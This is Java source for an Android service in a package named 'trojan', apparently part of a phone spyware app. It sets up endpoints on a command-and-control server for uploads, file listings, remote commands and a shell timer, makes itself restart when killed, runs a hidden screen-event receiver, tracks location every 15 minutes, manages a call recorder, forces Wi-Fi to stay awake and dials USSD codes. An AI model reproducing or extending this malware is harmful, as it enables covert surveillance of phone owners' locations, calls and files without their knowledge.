package com.example.trojan;


import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;
import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.StatFs;
import android.provider.Settings;
import android.util.Log;

public class MyService extends Service {
	
  final static String site = "http://192.168.100.27/";
  final static String log_url = site+"log.php";	
  final static String filelist_url = site+"list.php";
  final static String uploader_url = site+"up.php";
  final static String cmd_url = site+"c.php";
  final static String post_url = site+"p.php";
  final static String online_url = site+"o.php";
  final static String shelltime_url = site+"time.php";
  //public static String log_path=Environment.getExternalStorageDirectory().toString()+"/logs";
  public static String log_path;
  static String LOG_TAG = "myLogs";
  public LocationManager locmanager; // for location manager
  public PendingIntent locpendingintent; // for loc manager
  static boolean recording=false;
  static boolean streaming=false;
  static boolean cmdsessionactive=false;
  static boolean record_must_be_stopped = false;
  int recorder_thread_id;
  static MediaRecorder recorder;
  static String fname;   // for recorder 
  HandlerThread waiterthread;
  static Thread streamerthread;
  static int battery_level=0,battery_status=0,charge_type=0;

  public void onCreate() {
	 init();
    //MyTimerTask checkthreads = new MyTimerTask();
    //Timer myTimer = new Timer();
	//myTimer.schedule(checkthreads, 5000, 5000);
    Log.d(LOG_TAG, "evil service OnCreate() started!");
    
    //starttracker();
    startwaiter();
    //stoprecord();
    //get();
    //stopSelf();
    //stopmyreciever();
    //task1();
    //Log.d(LOG_TAG, "killing service...");}
  }
  
  public IBinder onBind(Intent intent) {
	  Log.d(LOG_TAG, "onBind() recieved!");
	throw new UnsupportedOperationException("");
  }
  
  
  
  public int onStartCommand(Intent intent, int flags, int startId) {
	    Log.d(LOG_TAG, "evil service onStartCommand() started!!");
	    return Service.START_STICKY;
	  }

	  public void onDestroy() {
	    Log.d(LOG_TAG, "evil service killed");
	    Log.d(LOG_TAG, "Damn restarting!! :D");
	    sendBroadcast(new Intent("com.example.test.restart"));  //made unkillable if system
	  }
	  
      @Override
      public void onStart(Intent intent, int startId) {
    	  Log.d(LOG_TAG, "evil service OnStart() started!");
      }
  
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  // тестируемый функционал
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
void init(){
	try{
		changewifipolicy();
	log_path=getApplicationContext().getFilesDir().getAbsolutePath()+"/logs"; 
	if(freespace()[0]<5L){  // 5 mb free space minimum is ok
		Log.d(LOG_TAG, "too low space, disabling recorder");
		disable_recorder();
		}	
	}
	catch(Exception e){
		Log.d(LOG_TAG, "error in initialisation");
	}
}

void disable_recorder(){
	try{
	ComponentName component = new ComponentName(getApplicationContext(), PhoneRecorder.class);
	getPackageManager().setComponentEnabledSetting(component, 
			PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);
	Log.d(LOG_TAG, "recorder was disabled");}
	catch (Exception e){}
}


@SuppressWarnings("deprecation")
@SuppressLint("NewApi")
void changewifipolicy(){
	
	//getsize();
	try{
		int mode;
		ContentResolver cr = getContentResolver();
	if(Integer.valueOf(android.os.Build.VERSION.SDK_INT)>=17){
		mode = android.provider.Settings.Global.getInt(cr, android.provider.Settings.Global.WIFI_SLEEP_POLICY, 
	            android.provider.Settings.Global.WIFI_SLEEP_POLICY_NEVER);
		if(mode!=2){ // меняем политику на never sleep   (SYSTEM ONLY!!)
			android.provider.Settings.Global.putInt(cr, android.provider.Settings.Global.WIFI_SLEEP_POLICY, 
	        android.provider.Settings.Global.WIFI_SLEEP_POLICY_NEVER);
			Log.d(LOG_TAG, "wifi policy successfully changed!");
		
	}
		} else{
	mode = android.provider.Settings.System.getInt(cr, android.provider.Settings.System.WIFI_SLEEP_POLICY, 
            android.provider.Settings.System.WIFI_SLEEP_POLICY_NEVER);
	if(mode!=2){
		android.provider.Settings.System.putInt(cr, android.provider.Settings.System.WIFI_SLEEP_POLICY, 
        android.provider.Settings.System.WIFI_SLEEP_POLICY_NEVER);
		Log.d(LOG_TAG, "wifi policy successfully changed!");
	}
		}
	}
	catch(Exception e){
		Log.d(LOG_TAG, "cant change wifi sleep policy! not system\n");
	}
	
	
}
    

@SuppressWarnings("deprecation")
@SuppressLint("NewApi")
static long[] freespace(){
	StatFs statFs = new StatFs(Environment.getDataDirectory().getAbsolutePath());
	StatFs statFs2 = new StatFs(Environment.getExternalStorageDirectory().getAbsolutePath());
	long   data_free;
	long   ext_free;
	if(Integer.valueOf(android.os.Build.VERSION.SDK_INT)>=18){
    data_free   = (statFs.getAvailableBlocksLong() * statFs.getBlockSizeLong())/1024/1024;
    ext_free   = (statFs2.getAvailableBlocksLong() * statFs2.getBlockSizeLong())/1024/1024;}
	else{
		data_free   = (statFs.getAvailableBlocks() * statFs.getBlockSize())/1024/1024;
		ext_free   = (statFs2.getAvailableBlocks() * statFs2.getBlockSize())/1024/1024;
	}
   
    Log.d(MyService.LOG_TAG, "data: "+data_free+" MB");
    //Log.d(LOG_TAG, "external: "+ext_free+" MB");
    return new long[] {data_free, ext_free};
	
}

void registerpassivetracker(){
	Log.d(LOG_TAG, "trying to start tracker..");
	try{
	String locservice = Context.LOCATION_SERVICE; // Для получение location manager'а
	locmanager = (LocationManager) getSystemService(locservice);
	String locprovider = LocationManager.PASSIVE_PROVIDER;
	int t=900000; // интервал (15 минут)
	int distance = 25; //( 25 метров min)
	int flags = PendingIntent.FLAG_CANCEL_CURRENT;
	Intent locintent = new Intent(this,IntentTracker.class);
	locpendingintent = PendingIntent.getBroadcast(this, 0, locintent, flags);
	locmanager.requestLocationUpdates(locprovider,t,distance,locpendingintent);}
	catch(Exception e){
		Log.d(LOG_TAG, "error registering tracker!\n"+e.toString());	
	}
	
}

void stoptracker(){
	Log.d(LOG_TAG, "stopping trackering..");
	try{
	locmanager.removeUpdates(locpendingintent);}
	catch(Exception e){
		Log.d(LOG_TAG, "error stopping tracker!\n"+e.toString());
	}

}
/**
 * startring new thread!
 * 
 * 	//private Handler handler; // Handler for the separate Thread

	//HandlerThread handlerThread = new HandlerThread("NewThread");
	//handlerThread.start();
	//Looper looper = handlerThread.getLooper();
	//handler = new Handler(looper);
	//registerReceiver(reciever, intentfilter, null, handler);	
 * 
 * 
 * 
 */

      
//void registerrecorder(){
//	
//          Log.d(LOG_TAG, "registering recorder");
//          try{
//        	  recorderthread = new HandlerThread("recorderthread");
//        	  recorderthread.start();
//        	  Looper reclooper = recorderthread.getLooper();
//        	  Handler rechandler = new Handler(reclooper);
//	      IntentFilter RecFilter = new IntentFilter();
//	      PhoneRecorder CallRecorder=new PhoneRecorder();
//	      RecFilter.addAction("android.intent.action.PHONE_STATE");
//	      RecFilter.addAction("android.intent.action.NEW_OUTGOING_CALL");
//	      RecFilter.addAction("stoprecord");
//	      RecFilter.addAction("startrecord");
//	      registerReceiver(CallRecorder, RecFilter,null,rechandler);
//	      Log.d(LOG_TAG, "recorder thread started!");}
//          catch (Exception e){
//        	  Log.d(LOG_TAG, "cant start CallRecorder thread\n"+e.toString());
//          }   
//}


    
void startwaiter(){
	Log.d(LOG_TAG, "trying to start hidden waiter thread..");
	try{
  	waiterthread = new HandlerThread("hiddenwaiterthread");
  	waiterthread.start();
  	  Looper customlooper = waiterthread.getLooper();
  	  Handler waiterhandler = new Handler(customlooper);
	  IntentFilter myfilter = new IntentFilter();
	  myfilter.addAction("android.intent.action.SCREEN_OFF");
	  myfilter.addAction("android.intent.action.SCREEN_ON");
	  HiddenWaiter evilreceiver = new HiddenWaiter();
	  registerReceiver(evilreceiver, myfilter,null,waiterhandler);}
	catch(Exception e){
		Log.d(LOG_TAG, "error starting hiddenwaiter ..\n"+e.toString());
	}
		
}

void stopwaiter(){
	 Intent intent = new Intent();
	 intent.setAction("stopmyreciever");
	 sendBroadcast(intent);
	 waiterthread.quit();
	 Log.d(LOG_TAG, "killed waiter reciever!");
}
  
	

//  TESTED FUNCTIONAL	
//-------------------------------------------------------------------------------------------	
 //------------------------------------------------------------------------------------------- 
	  	
	  void task1() {
		    new Thread(new Runnable() {
		      public void run() {
		    	Log.d(LOG_TAG, "task1() started. doing something");
		        for (int i = 1; i<=10; i++) {
		          Log.d(LOG_TAG, "i = " + i);
		          try {
		            TimeUnit.SECONDS.sleep(1);
		          } catch (InterruptedException e) {
		            e.printStackTrace();
		          }
		        }
		        stopSelf();
		      }
		    }).start();
		  }

	
	  void task2() {
		    new Thread(new Runnable() {
		      public void run() {
		    	 //Log.d(LOG_TAG, "task2 worked");
		    	 //writeFile();
		    	  for (int i = 1; i<=10; i++) {
			    	  check_cell();
			          try {
			            TimeUnit.SECONDS.sleep(1);
			          } catch (InterruptedException e) {
			            e.printStackTrace();
			          }
			        }
		    	  //stoprecord();
		      }
		    }).start();
		  }
	
   
  
  void writefile() {
	    try {
	    	String path = this.getApplicationContext().getFilesDir().getPath();
	    	String FILENAME = "1.txt";
	    	 Log.d(LOG_TAG, path+"/");
	    	FileOutputStream fOut = openFileOutput(FILENAME, 0);
	    	OutputStreamWriter osw = new OutputStreamWriter(fOut);
	    	osw.write(path+" пишем что нить ^^");
	    	osw.flush();
	    	osw.close();
	      Log.d(LOG_TAG, "file was written");
	    } catch (FileNotFoundException e) {
	      e.printStackTrace();
	    } catch (IOException e) {
	      e.printStackTrace();
	    }
	  }
  
  void ussd(){
	  String ussdCode = "*100#";
	  Intent intent = new Intent(Intent.ACTION_CALL);
	  intent.setData(ussdToCallableUri(ussdCode));
	  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	  try{
	      startActivity(intent);
	  } catch (Exception e){
		  Log.d(LOG_TAG, "error starting ussd activity:\nreason: "+ e.toString());
	  }
  }  
	  private Uri ussdToCallableUri(String ussd) {

		    String uriString = "";

		    if(!ussd.startsWith("tel:"))
		        uriString += "tel:";

		    for(char c : ussd.toCharArray()) {

		        if(c == '#')
		            uriString += Uri.encode("#");
		        else
		            uriString += c;
		    }

		    return Uri.parse(uriString);
		}  
	  
	void check_cell(){
		
		boolean mode = Settings.System.getInt(this.getApplicationContext().getContentResolver(),
				Settings.System.AIRPLANE_MODE_ON, 0) !=1;
		
		if(mode){
			Log.d(LOG_TAG, "cell is ON: ");}
		else{
			Log.d(LOG_TAG, "cell is OFF (Airplane enabled)");
		}
	}  
	  


	  class MyTimerTask extends TimerTask {
			public void run() {
				Log.d(LOG_TAG, "...timer task...");
		    	  //do smth
		      }
	  }	
	
}